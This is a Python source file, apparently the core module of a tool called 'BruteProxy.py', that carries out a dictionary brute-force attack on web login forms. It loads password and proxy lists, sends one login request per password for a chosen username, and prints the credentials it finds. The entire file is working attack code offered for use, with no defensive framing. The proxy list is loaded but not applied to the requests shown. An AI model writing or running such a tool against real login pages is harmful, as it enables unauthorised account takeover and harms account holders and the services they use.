import requests
from Modules.Utilities import utilities
import json
import re

class colors:
    HEADER = '\033[95m'
    WHITE = '\033[0m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARK_CYAN = '\033[90m'

class attacker:

    # convert .txt file to big wordlist and proxylist dictonary
    def generateDicts(self, wordlistPath, proxylistPath):
        # generate wordlist
        a_file = open(wordlistPath, "r")
        attacker.wordlist = [(line.strip()).split() for line in a_file]
        a_file.close()

        # generate proxylist
        b_file = open(proxylistPath, "r")
        attacker.proxylist = [(line.strip()).split() for line in b_file]
        b_file.close()

    def setup(self, method, custom_request):
        attacker.method = method
        attacker.custom_request = custom_request

    def attack(self, target, username, wordlist, proxylist, errIdentfier, username_parameter, password_parameter):
        # set us some flags, counters and null vars
        creds_found = False
        badResponse_counter = 0
        wantsContinue = False

        # check if user wants custom request, parse it from request.json if so
        if attacker.custom_request == "True" or attacker.custom_request == "true":
            # he wants, error handle loading a file
            try:
                with open('request.json', 'r') as custom_request_json:
                    request_template_raw = custom_request_json.read()
            except:
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unable to read request template. Make sure that it is in BruteProxy.py root dir and is named \"request.json\"." + colors.ENDC)
                return 0
        else:
            # he don't want, just set it to default
            request_template_raw = "{\"" + username_parameter + "\": \"$username$\", \"" + password_parameter + "\": \"$password$\"}"

        # firstly, let's generate some dicts AND error handle this process, since this is very fishy
        try:
            attacker.generateDicts(0, wordlist, proxylist)

            # yay! dicts successfully generated, now let's check one more thing before we get started
            # check if both wordlist and proxylist contains atleast 5 items
            if len(attacker.wordlist) >= 5:
                # wordlist has, now let's look at the proxylist
                if len(attacker.proxylist) >= 5:
                    # now we're really set up to begin the attack!
                    # this process is very fishy too, we must handle that with care
                    try:
                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
                        for currentPwdNum in range(0, len(attacker.wordlist)):
                            # prepare paswords in current try
                            password = attacker.wordlist[currentPwdNum]
                            human_readble_pwd = str(password).replace("[", "").replace("]", "").replace("'", "")
                            # replace variables in template and convert it into dict
                            request_template = request_template_raw.replace("$username$", username).replace("$password$", human_readble_pwd)
                            currentRequestObj = json.loads(request_template)

                            # decide on GET or POST method
                            if attacker.method == "post":
                                currentRequest = requests.post(target, data = currentRequestObj)
                            elif attacker.method == "get":
                                currentRequest = requests.get(target, data = currentRequestObj)

                            # request sent, let's evalute the response
                            currentResponse__text = currentRequest.text
                            currentResponse__code = currentRequest.status_code

                            if currentResponse__text.find(errIdentfier) == -1 and currentResponse__code < 400:
                                # YAY! we have got the creds, user will be happy!
                                # set a flag
                                creds_found = True

                                # greet a user with a great news
                                print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + human_readble_pwd)

                                # before we actaully end loop, if the user has not specified or wrongly specified the error identifier, the very first password will popup
                                # as correct, since it did not find that value in response, so we can theoretically detect that and only inform the user about this
                                if currentPwdNum == 0:
                                    print(colors.OKCYAN + "[]" + colors.ENDC)
                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Note that the very first password in wordlist was detected as correct." + colors.ENDC)
                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier." + colors.ENDC)
                                # end loop
                                break
                            elif currentResponse__code >= 400:
                                # something is wrong, try again and increase the counter or print out the error message
                                if badResponse_counter > 2 and wantsContinue == False:
                                    # 3 tries were made, stop a loop, reset counter and ash the user if he wants to continue even that there is unsuccessful connection with server
                                    print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Connection with webserver was unsuccessful, getting " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.FAIL + " error code.")
                                    if utilities.Question(0, "Do you want to continue and complete trying the whole wordlist, even that we're receiving error code?"):
                                        # user responded yes, set a wantsContinue flag to true and continue in loop
                                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Copy that. Finishing trying the whole wordlist. Error codes will be ignored." + colors.ENDC)
                                        wantsContinue = True
                                        badResponse_counter = 0
                                        continue 
                                    else:
                                        # user responded no, end a loop
                                        badResponse_counter = 0
                                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "OK. Ending the main loop. Try to check if target parameter is set up correctly." + colors.ENDC)
                                        return 0                            
                                elif wantsContinue == False:
                                    # we're still trying, increase the counter and print out an info
                                    print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "] " + colors.ENDC + colors.WARNING + "Recived error code " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.WARNING + ". Trying again..." + colors.ENDC)
                                    badResponse_counter = badResponse_counter + 1
                                    continue
                            else:
                                # this request was unsuccessfull, continue in loop
                                continue
                        
                        # reset some flags and counters
                        wantsContinue = False

                        # if for was unsuccessful and the creds weren't found, print this
                        if not creds_found:
                            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Credentials were not found in wordlist, we're sorry :(" + colors.ENDC)
                        else:
                            # creds were found, reset the flag, so we will not glitch afterwards
                            creds_found = False                   
                    except:
                        print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "There was an unexpected error in main loop, please make sure that everything is set up correctly" + colors.ENDC)
                else:
                    # proxylist too short
                    print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Proxylist is in wrong format or is too short (it must contain atleast 5 items)" + colors.ENDC)
            else:
                # wordlist too short
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Wordlist is in wrong format or is too short (it must contain atleast 5 items)" + colors.ENDC)
        except:
            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unexpected error, ensure that both files are here and they're in right format" + colors.ENDC)
